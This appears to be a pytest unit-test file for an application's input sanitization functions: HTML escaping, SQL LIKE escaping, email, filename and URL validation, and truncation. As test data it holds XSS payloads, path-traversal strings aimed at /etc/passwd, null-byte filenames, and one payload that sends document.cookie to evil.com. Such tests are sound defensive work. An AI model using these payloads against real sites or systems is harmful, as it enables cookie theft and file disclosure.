"""
Unit tests for input sanitization
Tests XSS prevention, SQL injection prevention, and input validation
"""
import pytest
from app.core.input_sanitization import (
    sanitize_html,
    sanitize_sql_like_pattern,
    validate_email_format,
    sanitize_filename,
    validate_url,
    truncate_string
)


class TestHTMLSanitization:
    """Test HTML/XSS sanitization"""

    def test_sanitize_basic_html_tags(self):
        """Test that HTML tags are escaped"""
        # Arrange
        malicious_input = "<script>alert('XSS')</script>"

        # Act
        result = sanitize_html(malicious_input)

        # Assert
        assert "<script>" not in result
        assert "&lt;script&gt;" in result
        assert "alert" in result  # Content preserved, tags escaped

    def test_sanitize_html_with_onerror_handler(self):
        """Test that event handlers are removed"""
        # Arrange
        malicious_input = '<img src=x onerror="alert(1)">'

        # Act
        result = sanitize_html(malicious_input)

        # Assert
        assert "onerror" not in result
        assert "alert" not in result or "&lt;" in result

    def test_sanitize_html_with_onclick_handler(self):
        """Test that onclick handlers are removed"""
        # Arrange
        malicious_input = '<div onclick="malicious()">Click</div>'

        # Act
        result = sanitize_html(malicious_input)

        # Assert
        assert "onclick" not in result.lower() or "&lt;" in result

    def test_sanitize_html_preserves_safe_text(self):
        """Test that safe text is preserved"""
        # Arrange
        safe_input = "This is safe text with numbers 123 and symbols !@#"

        # Act
        result = sanitize_html(safe_input)

        # Assert
        assert result == safe_input

    def test_sanitize_html_handles_empty_string(self):
        """Test handling of empty string"""
        # Arrange
        empty_input = ""

        # Act
        result = sanitize_html(empty_input)

        # Assert
        assert result == ""

    def test_sanitize_html_handles_non_string_input(self):
        """Test that non-string input is returned unchanged"""
        # Arrange
        number_input = 12345

        # Act
        result = sanitize_html(number_input)

        # Assert
        assert result == 12345

    @pytest.mark.parametrize("xss_payload", [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(1)>",
        "<iframe src='javascript:alert(1)'>",
        "<body onload=alert(1)>",
        "<svg onload=alert(1)>",
        "javascript:alert(1)",
        "<a href='javascript:void(0)'>",
    ])
    def test_sanitize_common_xss_payloads(self, xss_payload):
        """Test sanitization of common XSS payloads"""
        # Act
        result = sanitize_html(xss_payload)

        # Assert
        # Either completely removed or escaped
        assert "alert(1)" not in result or "&lt;" in result
        assert "<script>" not in result
        assert "javascript:" not in result or "&lt;" in result or "&#x" in result

    def test_sanitize_html_nested_tags(self):
        """Test sanitization of nested malicious tags"""
        # Arrange
        malicious_input = "<div><script>alert('XSS')</script></div>"

        # Act
        result = sanitize_html(malicious_input)

        # Assert
        assert "<script>" not in result
        assert "&lt;" in result


class TestSQLLikePatternSanitization:
    """Test SQL LIKE pattern sanitization"""

    def test_sanitize_sql_like_percent_sign(self):
        """Test that % is properly escaped"""
        # Arrange
        input_text = "100% complete"

        # Act
        result = sanitize_sql_like_pattern(input_text)

        # Assert
        assert result == "100\\% complete"

    def test_sanitize_sql_like_underscore(self):
        """Test that _ is properly escaped"""
        # Arrange
        input_text = "test_file"

        # Act
        result = sanitize_sql_like_pattern(input_text)

        # Assert
        assert result == "test\\_file"

    def test_sanitize_sql_like_backslash(self):
        """Test that \\ is properly escaped"""
        # Arrange
        input_text = "path\\to\\file"

        # Act
        result = sanitize_sql_like_pattern(input_text)

        # Assert
        assert result == "path\\\\to\\\\file"

    def test_sanitize_sql_like_combined_special_chars(self):
        """Test multiple special characters together"""
        # Arrange
        input_text = "test_%pattern\\"

        # Act
        result = sanitize_sql_like_pattern(input_text)

        # Assert
        assert result == "test\\_\\%pattern\\\\"

    def test_sanitize_sql_like_handles_non_string(self):
        """Test that non-string input is returned unchanged"""
        # Arrange
        number_input = 12345

        # Act
        result = sanitize_sql_like_pattern(number_input)

        # Assert
        assert result == 12345

    def test_sanitize_sql_like_preserves_safe_text(self):
        """Test that safe text is preserved"""
        # Arrange
        safe_input = "normal text without special chars"

        # Act
        result = sanitize_sql_like_pattern(safe_input)

        # Assert
        assert result == safe_input


class TestEmailValidation:
    """Test email format validation"""

    @pytest.mark.parametrize("valid_email", [
        "user@example.com",
        "test.user@example.co.uk",
        "user+tag@example.com",
        "user123@test-domain.com",
        "a@b.co",
    ])
    def test_validate_valid_email_formats(self, valid_email):
        """Test that valid email formats are accepted"""
        # Act
        result = validate_email_format(valid_email)

        # Assert
        assert result == valid_email.lower()

    @pytest.mark.parametrize("invalid_email", [
        "notanemail",
        "@example.com",
        "user@",
        "user @example.com",
        "user@.com",
        "user@domain",
        "",
        "user@@example.com",
    ])
    def test_validate_invalid_email_formats(self, invalid_email):
        """Test that invalid email formats are rejected"""
        # Act & Assert
        with pytest.raises(ValueError) as exc_info:
            validate_email_format(invalid_email)
        assert "email" in str(exc_info.value).lower()

    def test_validate_email_normalizes_to_lowercase(self):
        """Test that emails are normalized to lowercase"""
        # Arrange
        email = "Test.User@Example.COM"

        # Act
        result = validate_email_format(email)

        # Assert
        assert result == "test.user@example.com"

    def test_validate_email_strips_whitespace(self):
        """Test that whitespace is stripped"""
        # Arrange
        email = "  user@example.com  "

        # Act
        result = validate_email_format(email)

        # Assert
        assert result == "user@example.com"

    def test_validate_email_rejects_none(self):
        """Test that None is rejected"""
        # Act & Assert
        with pytest.raises(ValueError):
            validate_email_format(None)

    def test_validate_email_rejects_empty_string(self):
        """Test that empty string is rejected"""
        # Act & Assert
        with pytest.raises(ValueError):
            validate_email_format("")


class TestFilenameSanitization:
    """Test filename sanitization for path traversal prevention"""

    def test_sanitize_filename_removes_path_traversal(self):
        """Test that ../ and ..\\ are removed"""
        # Arrange
        malicious_filename = "../../../etc/passwd"

        # Act
        result = sanitize_filename(malicious_filename)

        # Assert
        assert "../" not in result
        assert result == "etcpasswd"

    def test_sanitize_filename_removes_path_separators(self):
        """Test that path separators are replaced"""
        # Arrange
        filename = "path/to/file.txt"

        # Act
        result = sanitize_filename(filename)

        # Assert
        assert "/" not in result
        assert "\\" not in result
        assert result == "path_to_file.txt"

    def test_sanitize_filename_removes_null_bytes(self):
        """Test that null bytes are removed"""
        # Arrange
        filename = "file\x00.txt"

        # Act
        result = sanitize_filename(filename)

        # Assert
        assert "\x00" not in result

    def test_sanitize_filename_allows_alphanumeric_and_safe_chars(self):
        """Test that safe characters are preserved"""
        # Arrange
        filename = "my-file_name.v2.txt"

        # Act
        result = sanitize_filename(filename)

        # Assert
        assert result == "my-file_name.v2.txt"

    def test_sanitize_filename_prevents_hidden_files(self):
        """Test that hidden files (starting with .) are prevented"""
        # Arrange
        filename = ".hidden_file"

        # Act
        result = sanitize_filename(filename)

        # Assert
        assert not result.startswith(".")
        assert result == "_hidden_file"

    def test_sanitize_filename_truncates_long_names(self):
        """Test that very long filenames are truncated"""
        # Arrange
        long_filename = "a" * 300 + ".txt"

        # Act
        result = sanitize_filename(long_filename)

        # Assert
        assert len(result) <= 255

    def test_sanitize_filename_preserves_extension_when_truncating(self):
        """Test that file extension is preserved when truncating"""
        # Arrange
        long_filename = "a" * 300 + ".txt"

        # Act
        result = sanitize_filename(long_filename)

        # Assert
        assert result.endswith(".txt")

    def test_sanitize_filename_rejects_empty_string(self):
        """Test that empty filename is rejected"""
        # Act & Assert
        with pytest.raises(ValueError):
            sanitize_filename("")

    def test_sanitize_filename_rejects_none(self):
        """Test that None is rejected"""
        # Act & Assert
        with pytest.raises(ValueError):
            sanitize_filename(None)

    @pytest.mark.parametrize("dangerous_filename", [
        "../../etc/passwd",
        "..\\..\\windows\\system32",
        "/etc/passwd",
        "C:\\Windows\\System32\\config",
        "file\x00.exe.txt",
    ])
    def test_sanitize_dangerous_filenames(self, dangerous_filename):
        """Test sanitization of various dangerous filenames"""
        # Act
        result = sanitize_filename(dangerous_filename)

        # Assert
        assert "../" not in result
        assert "..\\" not in result
        assert "/" not in result
        assert "\\" not in result
        assert "\x00" not in result


class TestURLValidation:
    """Test URL validation"""

    @pytest.mark.parametrize("valid_url", [
        "http://example.com",
        "https://example.com",
        "https://example.com:8080",
        "https://sub.example.com/path",
        "http://192.168.1.1",
    ])
    def test_validate_valid_urls(self, valid_url):
        """Test that valid URLs are accepted"""
        # Act
        result = validate_url(valid_url)

        # Assert
        assert result == valid_url.strip()

    @pytest.mark.parametrize("invalid_url", [
        "javascript:alert(1)",
        "data:text/html,<script>alert(1)</script>",
        "file:///etc/passwd",
        "ftp://example.com",
        "example.com",
        "",
    ])
    def test_validate_invalid_urls(self, invalid_url):
        """Test that invalid or dangerous URLs are rejected"""
        # Act & Assert
        with pytest.raises(ValueError):
            validate_url(invalid_url)

    def test_validate_url_requires_http_or_https(self):
        """Test that only HTTP/HTTPS schemes are allowed"""
        # Act & Assert
        with pytest.raises(ValueError) as exc_info:
            validate_url("ftp://example.com")
        assert "http" in str(exc_info.value).lower()

    def test_validate_url_strips_whitespace(self):
        """Test that whitespace is stripped"""
        # Arrange
        url = "  https://example.com  "

        # Act
        result = validate_url(url)

        # Assert
        assert result == "https://example.com"

    def test_validate_url_rejects_none(self):
        """Test that None is rejected"""
        # Act & Assert
        with pytest.raises(ValueError):
            validate_url(None)

    def test_validate_url_rejects_empty_string(self):
        """Test that empty string is rejected"""
        # Act & Assert
        with pytest.raises(ValueError):
            validate_url("")


class TestStringTruncation:
    """Test string truncation for DoS prevention"""

    def test_truncate_string_within_limit(self):
        """Test that strings within limit are unchanged"""
        # Arrange
        short_string = "This is a short string"

        # Act
        result = truncate_string(short_string, max_length=1000)

        # Assert
        assert result == short_string

    def test_truncate_string_exceeds_limit(self):
        """Test that long strings are truncated"""
        # Arrange
        long_string = "a" * 2000

        # Act
        result = truncate_string(long_string, max_length=1000)

        # Assert
        assert len(result) == 1000
        assert result == "a" * 1000

    def test_truncate_string_default_max_length(self):
        """Test default max length of 1000"""
        # Arrange
        long_string = "a" * 1500

        # Act
        result = truncate_string(long_string)

        # Assert
        assert len(result) == 1000

    def test_truncate_string_custom_max_length(self):
        """Test custom max length"""
        # Arrange
        string = "a" * 200

        # Act
        result = truncate_string(string, max_length=100)

        # Assert
        assert len(result) == 100

    def test_truncate_string_handles_non_string(self):
        """Test that non-string input is returned unchanged"""
        # Arrange
        number_input = 12345

        # Act
        result = truncate_string(number_input)

        # Assert
        assert result == 12345

    def test_truncate_string_empty_string(self):
        """Test handling of empty string"""
        # Arrange
        empty_string = ""

        # Act
        result = truncate_string(empty_string)

        # Assert
        assert result == ""

    def test_truncate_string_exactly_at_limit(self):
        """Test string exactly at limit"""
        # Arrange
        exact_string = "a" * 1000

        # Act
        result = truncate_string(exact_string, max_length=1000)

        # Assert
        assert len(result) == 1000
        assert result == exact_string


@pytest.mark.security
class TestInputSanitizationSecurity:
    """Security-focused tests for input sanitization"""

    def test_prevents_stored_xss(self):
        """Test that stored XSS attacks are prevented"""
        # Arrange
        malicious_input = "<script>document.cookie</script>"

        # Act
        result = sanitize_html(malicious_input)

        # Assert
        assert "<script>" not in result
        assert "document.cookie" not in result or "&lt;" in result

    def test_prevents_reflected_xss(self):
        """Test that reflected XSS attacks are prevented"""
        # Arrange
        malicious_input = '<img src=x onerror="location.href=\'http://evil.com?c=\'+document.cookie">'

        # Act
        result = sanitize_html(malicious_input)

        # Assert
        assert "onerror" not in result or "&lt;" in result
        assert "location.href" not in result

    def test_prevents_path_traversal(self):
        """Test that path traversal attacks are prevented"""
        # Arrange
        malicious_filename = "../../../../etc/passwd"

        # Act
        result = sanitize_filename(malicious_filename)

        # Assert
        assert "../" not in result
        assert "etc" in result  # Content preserved
        assert "passwd" in result

    def test_prevents_null_byte_injection(self):
        """Test that null byte injection is prevented"""
        # Arrange
        malicious_filename = "file.txt\x00.exe"

        # Act
        result = sanitize_filename(malicious_filename)

        # Assert
        assert "\x00" not in result

    def test_prevents_javascript_protocol_in_urls(self):
        """Test that javascript: protocol URLs are rejected"""
        # Arrange
        malicious_url = "javascript:alert(document.domain)"

        # Act & Assert
        with pytest.raises(ValueError):
            validate_url(malicious_url)
